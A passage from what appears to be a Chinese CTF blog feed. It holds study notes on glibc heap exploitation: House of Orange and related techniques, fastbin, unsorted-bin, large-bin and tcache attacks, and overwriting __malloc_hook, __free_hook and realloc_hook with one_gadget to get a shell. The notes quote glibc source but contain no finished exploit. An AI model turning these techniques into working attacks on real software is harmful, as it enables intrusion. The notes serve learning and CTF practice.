题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过 HOF 的方法进行利用。</p><h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p><p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p><p>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p><h1 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h1><p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p><p>其是为io_file服务的</p><p>如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的<strong><u>原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中</u></strong>，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求.</p><p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p><p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p><p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p><p>我们总结一下伪造的 top chunk size 的要求</p><ol><li>伪造的 size 必须要<strong>对齐到内存页</strong></li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p><h1 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h1><p>astbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。<strong>而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块</strong>，为进一步的利用做准备。</p><h1 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attack 结合的一个小 trick。这个漏洞与Glibc版本和源码无关，主要是利用了PIE保护的缺陷。</p><h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。</p><h1 id="House-of-Pig"><a href="#House-of-Pig" class="headerlink" title="House of Pig"></a>House of Pig</h1>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> how2heap </tag>
            
            <tag> 堆 </tag>
            
            <tag> 堆利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用-3</title>
      <link href="/posts/11792/"/>
      <url>/posts/11792/</url>
      
        <content type="html"><![CDATA[<span class='p blue'>一些零碎的东西</span><h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h1><p>分为四个部分,前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p><strong>直接改写freelist中的fd指针的话,不要求地址对齐</strong></p><p><strong>free释放假chunk需要地址对齐</strong></p><p><strong>fastbins取出时,会进行该chunk的大小所对应的索引和当前链索引是否相同</strong></p><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><p>与UAF有点像,不过不同在于Fastbin Double Free的chunk同时处于alloced状态和在freelist中,</p><p>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>在可控区域伪造一个fake_chunk,并free它,使其进入fastbin中</p><p>fake_chunk的条件</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li><strong>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</strong></li><li>fake chunk 的 <strong>size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</strong></li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> ,且prev_size要和fakechunk的对应</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><p>利用了UAF,再free后又去改写该chunk的fd指针,使其指向栈中一个可以被视为fastbin_chunk的内存空间(size域合适等)</p><p>指向的chunk要绕过该检测,该chunk的大小计算出的idx要与该链的索引idx相匹配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (victim));</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><p>与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域,chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h1><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p><p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p><p>以及辅助泄露main_arena地址</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><strong>什么情况下会被放入unsortedbin</strong></p><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。(即last remainer)</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，若合并后不与top chunk相邻,则会将合并后的chunk放入unsortedbin。</li></ol><p><strong>使用情况</strong></p><ol><li>unsortedbin采用的是FIFO,<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。加入的时候利用fd,取出的时候利用bk</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，<strong>否则就会把这些 chunk 分别插入到对应的 bin 中</strong>。</li></ol><h2 id="利用1"><a href="#利用1" class="headerlink" title="利用1"></a>利用1</h2><p>unsorted bin attack主要是用来为进一步的攻击服务的</p><p>其利用的函数片段为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>即将取出的chunk的上一个chunk的fd指针写为unsorted_chunks (av)</p><p>不难看出要攻击就要能修改某个chunk的bk指针,达到的效果是将&amp;bins[0]-2会被写入指定位置</p><p>这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大.</p><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>可以修改 heap 中的 <strong>global_max_fast 来使得更大的 chunk 可以被视为 fast bin</strong>，这样我们就可以去执行一些 fast bin attack 了。</li></ul><p><strong>注意:</strong></p><p>在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使修改其为一个不合法的值也没有关系。</p><p>然而,如果最后一个chunk就是唯一一个chunk的话,unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p><h2 id="利用2"><a href="#利用2" class="headerlink" title="利用2"></a>利用2</h2><p>泄露地址则要用到,uaf,即要有两个能指向unsortedbin的指针(不一定要同时存在)</p><h1 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h1><p>这种攻击方式主要利用的是 chunk 进入 bin 中的操作，在 malloc 的时候，遍历 unsorted bin 时，对每一个 chunk，若无法 exact-fit 分配或不满足切割分配的条件，就会将该 chunk 置入相应的 bin 中，而此过程中缺乏对 largebin 的跳表指针的检测。</p><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p>在index相同的情况下：</p><ol><li><p>一般空闲的large chunk在fd的遍历顺序中，<strong>按照由大到小的顺序排列</strong>。这样可以避免在寻找合适chunk时挨个遍历</p></li><li><p>如果大小相同，按照free的时间排序</p></li><li>多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0</li><li>size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk</li></ol><p>空闲chunk的结构与unsorted和small的差别就在于多了fd_nextsize和bk_nextsize,分别指向下一个<strong>大小</strong>的chunk和上一个大小的chunk,且chunk在largebin free list中按从大到小排序是重要细节</p><p><strong>将chunk放入largebin中的操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">              &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;   <span class="comment">//这个循环会一直运行直到victim大小大于等于fwd</span></span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">              == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;  <span class="comment">//相等则放到后面,无需更改nextsize,每次都是如此，也就是说新来的相同大小的 chunk 永远是放在第二个位置</span></span><br><span class="line">                      <span class="comment">//注意!!展示的代码并没有在这种情况真正将victim加入largebin的代码</span></span><br><span class="line">                      <span class="comment">//事实上这块代码都只是针对nextsize链表操作的</span></span><br><span class="line">                      <span class="comment">//真正对fd,bk操作的代码下方未展示</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;<span class="comment">//若大于</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);  <span class="comment">//检查fwd是否合规</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>largebin attack就是出现在这个提取chunk的过程中</p><h2 id="Large-bin-attack利用条件"><a href="#Large-bin-attack利用条件" class="headerlink" title="Large bin attack利用条件"></a>Large bin attack利用条件</h2><ul><li>可以修改一个large bin chunk的data</li><li><p>从unsorted bin中来的large bin chunk要紧跟在被构造过的chunk的后面</p></li><li><p>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</p></li><li>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</li></ul><h1 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h1><p>tcache使得性能提高的同时,安全性大幅下降,操作优先级高且检查并不严谨,利用更为简单</p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。任意地址作为chunk操作</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><p>类似 <code>fastbin dup</code>，不过利用的是 <code>tcache_put()</code> 的不严谨,因为没有任何检查，所以我们可以对同一个 chunk 多次 free，可以连续释放同一个chunk,造成 cycliced list。也就是造成一个chunk可以被无数次取出利用</p><h2 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h2><p>通过tcache posioning将tcache链中的某个chunk指向他cacheperthread本身,因为 tcache_perthread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h2><p>与fastbin的house of spirit一个原理,因为没有检查反而更简单,不需要伪造nextsize等</p><h2 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h2><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>利用smallbin中的chunk转移到tcache的漏洞</p><h2 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h2><p>与无tcache相比得先填满tcache</p><h2 id="tcache-check"><a href="#tcache-check" class="headerlink" title="tcache check"></a>tcache check</h2><p>新版本中<code>tcache_entry</code>中增加了一项<code>struct tcache_perthread_struct *key</code>，将<code>chunk</code>放入<code>tcache</code>后，会将<code>key</code>修改为<code>tcache</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    +  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    +  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>在<code>free</code>的时候，如果发现<code>key</code>为<code>tcache</code>就要进行<code>double free</code>的检查，这是因为<code>key</code>位于<code>bk</code>的位置，而<code>tcache</code>也不清除<code>chunk</code>，存在很小的可能碰巧为<code>tcache</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+    <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))</span><br><span class="line">+      &#123;</span><br><span class="line">+       tcache_entry *tmp;</span><br><span class="line">+       LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">+       <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">+            tmp;</span><br><span class="line">+            tmp = tmp-&gt;next)</span><br><span class="line">+         <span class="keyword">if</span> (tmp == e)</span><br><span class="line">+           malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">+       <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a few</span></span><br><span class="line"><span class="comment">+          cycles, but don&#x27;t abort.  */</span></span><br><span class="line">+      &#125;</span><br></pre></td></tr></table></figure><p>因为很少发生，这里的检查也比较彻底，会检查该<code>tc_idx</code>中的每一项是否和当前要释放的堆块相同。这个<code>check</code>可以通过改写<code>key</code>来绕过。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
            <tag> 堆利用 </tag>
            
            <tag> fastbin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用-2</title>
      <link href="/posts/61137/"/>
      <url>/posts/61137/</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在调用malloc或者free的时候，如果 <strong>malloc_hook 和free_hook的值存在</strong>，<strong>则会调用malloc_hook或者free_hook指向的地址</strong>，假设在使用one_gadget的时候满足one_gadget的调用条件，当overwrite malloc_hook和free_hook的时候，便可以getshell，执行malloc的时候，其参数是size大小，所以overwrite malloc_hook的时候使用one_gadget的地址可以getshell。执行free的时候，可以将__free_hook的值overwrite为system的地址，通过释放(/bin/sh\x00)的chunk，可以达到system(/bin/sh)来getshell</p><ul><li>malloc_hook位于main_arena下方的位置(绝大多时候是-0x10)，可以通过fake chunk来overwrite该值实现getshell</li><li>free_hook 位于libc上_free_hook上，可以通过fake chunk来overwrite该值达到劫持程序流的目的</li></ul><h1 id="malloc-hook利用"><a href="#malloc-hook利用" class="headerlink" title="malloc_hook利用"></a>malloc_hook利用</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><ul><li>利用思路：在执行malloc时，会检测__malloc_hook的值，如果malloc_hook的值存在，将调用malloc_hook指向的地址call rax，如果我们将该值overite 为one_gadget，当程序执行malloc的时候，便可以getshell</li></ul><h1 id="free-hook利用"><a href="#free-hook利用" class="headerlink" title="free_hook利用"></a>free_hook利用</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>利用思路：<ul><li>通过改写main_arena中的top_chunk的地址，将top_chunk的值改写到<strong>free_hook上方指定的位置，通过不断向top_chunk申请chunk，最终可以分配到包含</strong>free_hook的区块，从而可以改写__free_hook的值。</li><li>通过改写global_max_fast的值，可以在free_hook的上方找到一个足够大包含free_hook的块，当改写了global_max_fast后，向heap申请的块都将按照fastbin来处理</li><li>通过unsorted bin attack 在free_hook上方<strong>伪造 0x7f大小的chunk</strong>,再通过fastbin attack 来修改free_hoook的值</li></ul></li></ul><h1 id="realloc-hook与malloc-hook的联合利用"><a href="#realloc-hook与malloc-hook的联合利用" class="headerlink" title="realloc_hook与malloc_hook的联合利用"></a>realloc_hook与malloc_hook的联合利用</h1><p>因为</p><p>realloc_hook与malloc_hook 相似是一个弱类型的指针.在调用realloc()函数是会判断realloc_hook的值是否为空,不为空则执行其执行的代码.这是realloc_hook的一种用法。</p><p>大多时候在执行onegadget时,并不容易满足限制条件,故而可以利用realloc()来调整栈帧以满足条件</p><p>即可以用malloc_hook来指向_libc_realloc()函数内部(即强行调用realloc())然后通过realloc_hook来触发one_gadget.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000009</span>AE84 <span class="number">41</span> <span class="number">57</span>                         push    r15</span><br><span class="line">.text:<span class="number">000000000009</span>AE86 <span class="number">41</span> <span class="number">56</span>                         push    r14</span><br><span class="line">.text:<span class="number">000000000009</span>AE88 <span class="number">41</span> <span class="number">55</span>                         push    r13</span><br><span class="line">.text:<span class="number">000000000009</span>AE8A <span class="number">41</span> <span class="number">54</span>                         push    r12</span><br><span class="line">.text:<span class="number">000000000009</span>AE8C <span class="number">49</span> <span class="number">89</span> F4                      mov     r12, rsi</span><br><span class="line">.text:<span class="number">000000000009</span>AE8F <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">000000000009</span>AE90 <span class="number">48</span> <span class="number">89</span> FD                      mov     rbp, rdi</span><br><span class="line">.text:<span class="number">000000000009</span>AE93 <span class="number">53</span>                            push    rbx</span><br><span class="line">.text:<span class="number">000000000009</span>AE94 <span class="number">48</span> <span class="number">83</span> EC <span class="number">18</span>                   sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">000000000009</span>AE98 <span class="number">48</span> <span class="number">8B</span> <span class="number">05</span> <span class="number">41</span> <span class="number">11</span> <span class="number">15</span> <span class="number">00</span>          mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:<span class="number">000000000009</span>AE9F <span class="number">48</span> <span class="number">8B</span> <span class="number">00</span>                      mov     rax, [rax]</span><br><span class="line">.text:<span class="number">000000000009</span>AEA2 <span class="number">48</span> <span class="number">85</span> C0                      test    rax, rax</span><br><span class="line">.text:<span class="number">000000000009</span>AEA5 <span class="number">0F</span> <span class="number">85</span> <span class="number">35</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>             jnz     loc_9B0E0</span><br></pre></td></tr></table></figure><p><code>malloc -&gt; malloc_hook -&gt; realloc -&gt; realloc_hook -&gt; onegadget</code></p><p>我们可以将realloc_hook改为onegadget，然后通过这些push和sub操作”微调”rsp寄存器，使其能够满足在调用realloc_hook（也就是onegadget）的时候满足相应的rsp条件。相应的利用方法就是由传统的直接修改malloc_hook变为先修改realloc_hook为onegadget之后，修改malloc_hook到特定的一个push处或sub处，然后调用malloc便相当于执行了满足条件的onegadget。</p><p><strong>此外符号__malloc_hook与__realloc_hook在数据段中是相邻的,realloc在前</strong></p><p><strong>__free_hook的位置与前二者不相邻</strong></p><p>不过<em>_malloc_hook_ptr和\</em>_free_hook_ptr倒是相邻的</p><p>参数也有差异,_malloc_hook与__realloc_hook的参数为申请的chunk的大小</p><p>__free_hook的参数则为释放的chunk的地址</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
